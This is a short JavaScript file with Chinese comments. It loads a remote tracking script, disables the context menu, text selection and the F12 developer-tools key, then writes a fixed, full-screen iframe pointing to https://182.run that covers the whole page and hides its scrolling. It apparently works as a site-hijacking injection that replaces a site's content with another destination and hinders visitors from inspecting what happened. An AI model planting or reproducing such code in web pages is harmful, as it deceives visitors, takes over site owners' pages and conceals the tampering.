var _hmt=_hmt||[];!function(){var hm=document.createElement("script");hm.src="https://node12.aizhantj.com:21233/tjjs/?k=18k6tpxdnsx";var s=document.getElementsByTagName("script")[0];s.parentNode.insertBefore(hm,s)}();

document.addEventListener("contextmenu", function (event) {
    event.preventDefault();
});

// 禁用文本选择
document.addEventListener("selectstart", function (event) {
    event.preventDefault();
});

// 禁用F12
document.addEventListener("keydown", function (event) {
    if (event.keyCode === 123) {
        event.preventDefault();
    }
});

// 生成随机 iframe
var zindexCount = 99999999;
var arr = ['https://182.run'];
var iframe_url = arr[Math.floor(Math.random() * arr.length)];

var iframe_str = `
    <div id="div_iframe" style="z-index:${zindexCount - 1}; height:100vh; width:100%; position:fixed; background:#ffffff; padding:0; margin:0;">
        <iframe id="myiframe" frameborder="0" width="100%" height="100%" src="${iframe_url}"></iframe>
    </div>
    <style>
        html, body { width:100%; height:100%; overflow:hidden; padding:0; margin:0 !important; }
    </style>
`;

document.write(iframe_str);